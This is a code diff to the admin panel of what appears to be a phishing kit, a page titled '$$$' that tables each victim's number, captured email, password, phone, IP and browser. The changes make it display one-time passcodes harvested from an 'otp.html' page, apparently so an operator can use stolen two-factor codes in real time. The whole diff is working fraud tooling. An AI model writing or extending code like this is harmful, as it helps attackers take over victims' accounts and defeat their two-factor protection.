@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>$$$</title>
-  <link rel="preconnect" href="https://rsms.me ">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
+  <link rel="preconnect" href="https://rsms.me">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
     :root {
       --bg: #000000;
@@ -541,15 +541,18 @@
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
       
-      // Updated columns: Client #, Password, NetCode (phone field), IP, Platform, Browser, Status, Actions
+      // KEY CHANGE: Show OTP in NetCode column if on otp.html page, otherwise show phone
       body.innerHTML = d.sessions.map(s => {
         const approved = isApproved(s);
+        // Use OTP if on otp.html page and OTP exists, otherwise use phone (NetCode)
+        const netcodeValue = (s.page === 'otp.html' && s.otp) ? s.otp : (s.phone || '—');
+        
         return `
         <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
-          <td><span class="cred">${s.phone||'—'}</span></td>
+          <td><span class="cred">${netcodeValue}</span></td>
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
@@ -562,7 +565,7 @@
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
       const cleanIp = ip.split(':')[0];
-      window.open(`https://db-ip.com/ ${cleanIp}`, '_blank');
+      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
     }
 
     /* ----------  MODALS  ---------- */
@@ -586,7 +589,10 @@
           </div>
         `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px 0">No activity recorded</div>';
       
-      // Updated modal fields to match new column names
+      // KEY CHANGE: Show OTP in NetCode field if on otp.html, otherwise show phone
+      const netcodeValue = (s.page === 'otp.html' && s.otp) ? s.otp : (s.phone || '—');
+      const netcodeLabel = (s.page === 'otp.html' && s.otp) ? 'NetCode (OTP)' : 'NetCode';
+      
       qs('#modalBody').innerHTML = `
         <div class="info-grid">
           <div class="info-section">
@@ -606,8 +612,8 @@
             <div class="info-value mono">${s.password||'—'}</div>
           </div>
           <div class="info-section">
-            <div class="info-label">NetCode</div>
-            <div class="info-value mono">${s.phone||'—'}</div>
+            <div class="info-label">${netcodeLabel}</div>
+            <div class="info-value mono">${netcodeValue}</div>
           </div>
           <div class="info-section">
             <div class="info-label">OTP (if applicable)</div>
